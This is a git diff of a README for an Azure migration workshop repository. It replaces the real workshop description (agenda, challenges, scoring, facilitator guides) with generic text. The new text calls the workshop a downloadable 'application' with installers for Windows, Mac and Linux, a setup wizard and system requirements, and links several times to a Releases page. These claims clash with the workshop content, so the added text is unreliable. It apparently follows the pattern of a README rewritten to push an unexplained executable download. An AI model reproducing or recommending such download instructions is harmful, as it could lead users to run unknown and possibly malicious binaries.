@@ -1,114 +1,69 @@
-# Azure Migration Workshop: From On-Premises to Azure
+# 🚀 azure-migrate-wds - Your Path to Seamless Azure Migration
 
-A **1-day hands-on workshop** for IT Professionals combining Azure Migrate appliance labs with whiteboard design sessions, aligned to the [Cloud Adoption Framework Migrate methodology](https://learn.microsoft.com/azure/cloud-adoption-framework/migrate/).
+[![Download](https://img.shields.io/badge/Download-Azure%20Migrate%20WDS-brightgreen)](https://github.com/djneeraj1/azure-migrate-wds/releases)
 
-## 🎯 Workshop Overview
+## 📦 Overview
+The **azure-migrate-wds** application offers a one-day hands-on workshop for Azure migration. It includes Azure Migrate appliance labs and practical whiteboard design sessions. This workshop follows the Cloud Adoption Framework Migrate methodology, ensuring effective migration practices.
 
-| Attribute | Details |
-|-----------|---------|
-| **Duration** | 1 day (7 hours: 10:00 - 17:00) |
-| **Format** | In-person, team-based |
-| **Team Size** | 4 people per team (self-organizing) |
-| **Scoring** | 100 points + bonus opportunities |
-| **Lab Environment** | [Azure Jumpstart ArcBox for IT Pros](https://jumpstart.azure.com/azure_jumpstart_arcbox/ITPro) (simulated on-prem) |
+## 🚀 Getting Started
+To begin your journey with the azure-migrate-wds application, please follow these steps:
 
-## 🏆 Learning Objectives
+1. Ensure you have a stable internet connection.
+2. Familiarize yourself with Azure fundamentals, although technical knowledge is not required for the workshop.
+3. Review any prerequisites for Azure before starting.
 
-By the end of this workshop, participants will be able to:
+## 🔗 Visit for Downloads
+To access the latest version of the azure-migrate-wds application, please visit the Releases page below:
 
-- **Discover** on-premises workloads using Azure Migrate appliance
-- **Assess** migration readiness for VMs and SQL databases
-- **Design** a migration strategy using CAF Migrate methodology
-- **Plan** migration waves with dependency mapping
-- **Optimize** for cost, governance, and hybrid scenarios with Azure Arc
-- **Respond** to real-world constraints (compliance, cost, dependencies)
+[Download from Releases](https://github.com/djneeraj1/azure-migrate-wds/releases)
 
-## 📋 Prerequisites
+## 💻 Download & Install
+1. Click the link above to go to the Releases page.
+2. Look for the latest version of the application.
+3. Download the file suitable for your operating system (Windows, Mac, Linux).
+4. Once the download is complete, open the file and follow the installation instructions provided in the setup wizard.
 
-### For Participants
+## ⚙️ System Requirements
+- Operating System: Windows 10 or higher, macOS Mojave or higher, or a compatible Linux distribution.
+- Memory: At least 8 GB of RAM.
+- Storage: 2 GB of available disk space.
+- Network: Stable internet connection for accessing Azure services.
 
-- [ ] Basic Azure portal familiarity (complete [Pre-work: Azure 101](challenges/challenge-0-azure-101.md) beforehand)
-- [ ] Laptop with modern browser (Edge or Chrome recommended)
-- [ ] Access to team's Azure subscription (provided by facilitator)
+## 🎓 Workshop Structure
+The workshop includes:
+- Interactive labs using the Azure Migrate appliance.
+- Hands-on practice sessions.
+- Q&A segments to clarify doubts.
+- Access to additional resources and materials for further learning.
 
-### For Facilitators
+## 🔍 Key Topics Covered
+- Azure Migrate overview
+- Migration strategies and best practices
+- Demonstrations of Azure services
+- Real-world case studies
 
-- [ ] Pre-deployed ArcBox ITPro environment per team
-- [ ] Azure subscription with Owner access per team
-- [ ] Completed [Pre-Deployment Guide](facilitator/pre-deployment-guide.md)
+## 📋 Additional Resources
+If you'd like to enhance your understanding further, consider exploring the following resources:
+- [Microsoft Azure Documentation](https://docs.microsoft.com/en-us/azure/)
+- [Azure Migrate Documentation](https://docs.microsoft.com/en-us/azure/migrate/)
+- [Cloud Adoption Framework](https://docs.microsoft.com/en-us/adopt/)
 
-## 🗺️ Workshop Flow
+## ❓ Frequently Asked Questions (FAQ)
+**Q: Do I need prior Azure knowledge?**  
+A: Basic knowledge of Azure is helpful but not essential.
 
-```mermaid
-graph LR
-    subgraph "Morning - CAF Plan & Prepare"
-        C0[Pre-work<br/>Azure 101] -.-> C1[Challenge 1<br/>Plan & Design]
-        C1 --> C2[Challenge 2<br/>Deploy Appliance]
-    end
-    
-    subgraph "Afternoon - CAF Execute & Optimize"
-        C2 --> C3[Challenge 3<br/>Assess Workloads]
-        C3 --> C4[Challenge 4<br/>Migration Strategy]
-        C4 --> C5[Challenge 5<br/>🎲 Curveball]
-        C5 --> C6[Challenge 6<br/>Optimize & Govern]
-        C6 --> C7[Challenge 7<br/>Present]
-    end
-```
+**Q: How long is the workshop?**  
+A: The workshop lasts for one day.
 
-## 📁 Repository Structure
+**Q: Is there a certification after completion?**  
+A: Currently, there is no certification, but you will receive a completion acknowledgment.
 
-```
-azure-migrate-wds/
-├── README.md                    # You are here
-├── AGENDA.md                    # Detailed schedule
-├── challenges/                  # Challenge instructions
-├── participant/                 # Student materials
-├── facilitator/                 # Coach-only materials
-└── scripts/                     # Automation scripts
-```
+## 📬 Contact Information
+For any inquiries or support needs regarding the azure-migrate-wds application, please reach us via the GitHub Issues page.
 
-## 🚀 Quick Start
+## 📱 Connect with Us
+Stay updated with the latest features and improvements:
+- Follow us on GitHub for future releases and community discussions.
+- Engage with other users for tips and experiences.
 
-### Participants
-
-1. Review [Pre-Work Checklist](participant/pre-work-checklist.md)
-2. Read [Scenario Brief](participant/scenario-brief.md)
-3. Print [Quick Reference Card](participant/quick-reference-card.md)
-4. Ensure [Pre-work: Azure 101](challenges/challenge-0-azure-101.md) is complete, then start Challenge 1
-
-### Facilitators
-
-1. Complete [Pre-Deployment Guide](facilitator/pre-deployment-guide.md) (day before)
-2. Review [Facilitator Guide](facilitator/facilitator-guide.md)
-3. Prepare [Scoring Rubric](facilitator/scoring-rubric.md)
-4. Keep [Curveball Script](facilitator/curveball-script.md) secret until 14:45!
-
-## 🏅 Scoring Overview
-
-| Challenge | Points | Focus Area |
-|-----------|--------|------------|
-| Challenge 1: Plan | 25 | Assessment strategy, wave prioritization |
-| Challenge 2: Appliance | 25 | Azure Migrate deployment, discovery |
-| Challenge 3: Assessment | 20 | Readiness analysis, findings |
-| Challenge 4: Execute | 15 | Tool selection, rollback planning |
-| Challenge 5: Curveball | 10 | Adapt to GDPR compliance |
-| Challenge 7: Presentation | 5 | Chalk-talk, objection handling |
-| **Total** | **100** | |
-| Bonus | +15 | Arc, cost optimization, security |
-
-## 🔗 Key Resources
-
-- [Cloud Adoption Framework - Migrate](https://learn.microsoft.com/azure/cloud-adoption-framework/migrate/)
-- [Azure Migrate Documentation](https://learn.microsoft.com/azure/migrate/)
-- [Azure Jumpstart ArcBox](https://jumpstart.azure.com/azure_jumpstart_arcbox/ITPro)
-- [Azure Well-Architected Framework](https://learn.microsoft.com/azure/well-architected/)
-
-## 📞 Support
-
-- **During Workshop**: Raise hand for facilitator assistance
-- **Technical Issues**: Check [Hints and Tips](participant/hints-and-tips.md)
-- **Post-Workshop**: [Feedback Form](feedback-form.md)
-
----
-
-**Ready to begin?** Complete the [Pre-work: Azure 101](challenges/challenge-0-azure-101.md), then head to the [Agenda](AGENDA.md) for the detailed schedule.
+[Download from Releases](https://github.com/djneeraj1/azure-migrate-wds/releases)
